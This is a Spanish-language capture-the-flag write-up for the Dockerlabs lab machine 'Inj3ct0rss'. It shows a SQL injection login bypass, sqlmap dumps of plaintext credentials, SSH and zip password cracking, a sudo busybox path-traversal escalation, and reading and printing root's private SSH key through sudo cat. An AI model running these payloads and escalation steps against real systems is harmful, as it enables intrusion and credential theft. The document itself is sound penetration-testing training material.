
# Writeup Template: Maquina `[ Inj3ct0rss ]`

- Tags: #Inj3ct0rss
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Inj3ct0rss](https://mega.nz/file/BD0AVZLJ#xGYYLKOl2MYwvGipfsVQI-z0YRTMzq-tpXze-znT7bk)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x Inj3ct0rss.zip
sudo bash auto_deploy.sh inj3ct0rss.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada 

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 4025]
/login.php            (Status: 200) [Size: 1039]
/register.php         (Status: 200) [Size: 1053]
```

### Injeccion SQL:
Verificaremos si es vulnerable este panel de inicio de sesion:
```bash
http://172.17.0.2/login.php
```

**SQLQueryes** probadas:
```bash
'
admin'
admin' or 1=1-- -
admin' or '1'='1-- -
```

Con esta logramos evadir el panel de inicio de sesion:
```bash
admin' or sleep(5)-- -
```

Una ves ganado acceso nos redirige a esta pagina:
```bash
http://172.17.0.2/content_pages_hidden/welcome.php
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora sabiendo que el login es vulnerable a **inyeccion SQL** usaremos la herramienta **SQLMap** para automatizar la inyeccion
Primero Caputaramos la peticion con **burpsuite** del panel de inicio de sesion:
```bash
POST /content_pages_hidden/db.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```

### Ejecucion del Ataque
Una ves con la peticion realizaremos desacrubrimiento de las bases de datos:
```bash
sqlmap -r request.txt --dbs --batch
```

Tenemos las bases de datos:
```bash
available databases [5]:
[*] information_schema
[*] injectors_db
[*] mysql
[*] performance_schema
[*] sys
```

Ahora vamos a obtener las tablas para la base de datos: **injectors_db**
```bash
sqlmap -u http://172.17.0.2/login.php --forms -D injectors_db --tables --batch
```

Tenemos la tabla:
```bash
Database: injectors_db
[1 table]
+-------+
| users |
+-------+
```

Ahora vamos a dumpear los datos para esa tabla:
```bash
sqlmap -u http://172.17.0.2/login.php --forms -D injectors_db -T users --dump --batch
```

Tenemos la bd:
```bash
Database: injectors_db
Table: users
[5 entries]
+----+-----------------------------+----------+
| id | password                    | username |
+----+-----------------------------+----------+
| 1  | loveyou                     | root     |
| 2  | chicago123                  | jane     |
| 3  | password                    | admin    |
| 4  | no_mirar_en_este_directorio | ralf     |
| 5  | hacker                      | hacker   |
+----+-----------------------------+----------+
```

Usando estas credenciales como diccionanrio para realizar un ataque de fuera bruta no obtuvimos ningun usuario valido por **ssh**
```bash
hydra -L users.txt -P passwords.txt -f ssh://172.17.0.2
```

Ahora miraremos en este directorio **no_mirar_en_este_directorio**:
```bash
http://172.17.0.2/no_mirar_en_este_directorio/
```

Y vemos que contiene un archivo: **secret.zip** el cual descargaremos en nuestro equipo para relizar **esteganografia** en caso de que contenga datos o archivos ocultos:
Intentando descomprimir el archivo nos pide una contrasena que no tenemos
```bash
7z x secret.zip

Enter password (will not be echoed):
zsh: suspended  7z x secret.zip
```

Asi que realizaremos un ataque de fuerza bruta para descubrir la clave que nos permita descomprimir el archivo:
```bash
zip2john secret.zip > hash
ver 2.0 efh 5455 efh 7875 secret.zip/confidencial.txt PKZIP Encr: TS_chk, cmplen=132, decmplen=177, crc=D2FD3E9E ts=7A38 cs=7a38 type=8
```

Realizamos el ataque:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Tenemos la contrasena:
```bash
computer         (secret.zip/confidencial.txt)
```

Ahroa volvemos a descomprirmir el archivo ya con la contrasena:
```bash
7z x secret.zip # ( computer )
```

Obtuvimos este archivo: **confidencial.txt** y su contenido es:
```bash
File: confidencial.txt
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
You have to change your password ralf, I have told you many times, log into your account and I will change your password.
Your new credentials are:

ralf:supersecurepassword
```
### Intrusion
Ahora que tenemos las credenciales las usaremos para intentar conectarnos por **ssh** con el usuario **ralf**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh ralf@172.17.0.2 # ( supersecurepassword )
```

---

## Escalada de Privilegios

###### Usuario `[ ralf ]`:
Listando los usuario del sistema tenemos:
```bash
cat /etc/passwd | grep "sh"
```

users
```bash
root:x:0:0:root:/root:/bin/bash
ralf:x:1001:1001:ralf,,,:/home/ralf:/bin/bash
capa:x:1000:1000:capa,,,:/home/capa:/bin/bash
```

Listando los permsios para este usuario:
```bash
sudo -l

User ralf may run the following commands on 82aade8ab41b:
    (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
```

**BusyBox** es una herramienta fundamental en el mundo Linux, especialmente en sistemas embebidos y entornos con recursos limitados.
Es un **binario único** que combina versiones simplificadas de más de 300 comandos comunes de Unix/Linux en un solo ejecutable pequeño (típicamente 1-2 MB). Se le conoce como la **"navaja suiza de Linux embebido"**.
Ahora sabiendoe esto y que podemos ver la lista de cosas que podemos ejecutar con este binario:
```bash
busybox --list
```

Ahora nos aprovechamos de esto ya que podemos lanzar una **sh** como este usuario:
Para poder escapar del directorio tenemos que usar **pathTraversal**
```bash
sudo -u capa /usr/local/bin/busybox /nothing/../../usr/bin/sh
```
###### Usuario `[ capa ]`:
Ahora que tenemos una sesion como este usuario, Reseteamos la sh
Listando los archivos de este usuario tenemos lo siguiente: **passwd.txt**
```bash
cat passwd.txt 
capa:capaelmejor
```

Listando los permisos del usuario:
```bash
sudo -l

User capa may run the following commands on 82aade8ab41b:
    (ALL : ALL) NOPASSWD: /bin/cat # Tenemos una via potencial de migrar root
```

Nos aprovechamos de este binario para robar su clave **ssh** de **root**:
```bash
sudo -u root /bin/cat /root/.ssh/id_rsa
```

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Ahora esta clave la copiamos y la guardamos en un archivo **id_rsa** y despues le damos permsios:
```bash
chmod 600 id_rsa
```

Ahora nos conectamos como **root**
```bash
# Comando para escalar al usuario: ( root )
ssh -i id_rsa root@localhost
```

---

## Evidencia de Compromiso
Flags **root**
```bash
ls -la /root

-rw-r--r--  1 root root   68 Aug 14  2024 root.txt
-rw-r--r--  1 root root   33 Aug 14  2024 true_root.txt
```

```bash
# Captura de pantalla o output final
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Aug 14 17:57:47 2024 from 172.19.0.1

root@82aade8ab41b:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar ataques de inyeccion sql
2. Aprendimos a usar **SQLMap** para dumpear toda la informacion de la base de datos
3. Aprendimos a realizar esteganografia para obtener archivos ocultos
4. Aprendimos a realizar ataque de fuerza bruta a archivos para obtener su contrasena:
5. Aprendimos a abusar del binario **cat** para robar su clave **ssh** de **root**